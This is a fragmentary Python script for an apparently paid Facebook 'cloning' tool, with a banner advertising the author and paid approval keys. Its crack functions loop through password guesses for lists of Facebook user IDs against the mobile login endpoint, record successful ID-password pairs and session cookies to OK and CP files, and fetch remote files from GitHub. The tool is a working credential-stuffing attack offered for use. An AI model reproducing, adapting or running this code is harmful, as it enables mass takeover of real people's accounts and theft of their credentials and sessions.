...
try:
    prox = requests.get('https://github.com/devi7840/DEVI.py/blob/main/NEW-V7.3.py').text
...
def uaku():
    try:
        ...
        a = requests.get('https://github.com/deathherev/Cloning-Fb/blob/main/approval.txt').text
        ua = open('bbnew.txt', 'w')
...
os.system('xdg-open https://www.facebook.com/profile.php?id=61578248083866')
logo = '\n ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n ║\x1b[0;96m●▬▬▬▬▬๑THE LENGED BOIW DEVI๑▬▬▬▬▬▬●\x1b[0;91m║\n ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n   \n ▗▄▄▄  ▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖\n▐▌  █ ▐▌   ▐▌  ▐▌  █   \n▐▌  █ ▐▛▀▀▘▐▌  ▐▌  █   \n▐▙▄▄▀ ▐▙▄▄▖ ▝▚▞▘ ▗▄█▄▖                                            \n                                                      \n ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[0;95m[<Assalamualaikum>]\x1b[0;95m║\n ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\x1b[1;31m==================================================\n[\x7f] CODE BY      :      DEVI KING\n[\x7f] TOOLS        :     𝐅𝐈𝐋𝐄-𝐂𝐋𝐎𝐍𝐈𝐍𝐆\n[\x7f] TYPE         :      𝗣𝗔𝗜𝗗(𝐔𝐬𝐞𝐫 𝐎𝐧𝐥𝐲)\n[\x7f] FACEBOOK     :      DEVI ONFIRE\n[\x7f] VERSION      :      7.3\n[\x7f] Whatapp   :     +923263342276 \n=================================================="\x1b[1;23m'
balpakna = '\x1b[38;5;50m══════════════════════════════════════════════════'
meyermarexudi = ' \x1b[0;97m============================================='
alltimexudi = ' \x1b[32;1m[-] APPROVL KI FIXED PRICE HAI '
xudartimenai = ' \x1b[32;1m[+] CONTACT ADMIN '
fuckyoursali = ' \x1b[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳'
xudinaministar = ' \x1b[38;1m[-] Importent Note '
hedaborakarent = ' \x1b[35;1m[𝟸] Approval Lo Kidx Tool Enjoy kro '
    ...
    try:
        ...
        if id in httpCaht:
         ...
         #   msg = str(os.geteuid())
            ...
            os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   DEVI,   KING,    Please,   Send,   Your,   Key,"')
...
os.system('espeak -a 300 " Welcome,   to,  DEVI,  PAID,   Tools"')
...
def crack(idf, pwv):
    ...
    sys.stdout.write(f'\r\x1b[100;95m{bo}[DEVI  🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{{:.0%}}{P}]'.format(loop / float(len(id))) + ']\x1b[0;37m ')
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'\r\x1b[0;95m[DEVI -Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                ...
                print(f'\r\x1b[0;96m[DEVI -Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\x1b[0;91m[🌼]= COOKIES • \x1b[0;91m{kuki} ')
...
def crackfree(idf, pwv):
    sys.stdout.write(f'\r{H}[DEVI  🔍-M2]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{{:.0%}}{P}]  '.format(loop / float(len(id))))
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'\r\x1b[0;95m[{time.strftime("%H:%M")}•DEVI -Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                ...
                coki = po.cookies.get_dict()
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[10;92m[{time.strftime("%H:%M")}•DEVI -Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
                break
            else:
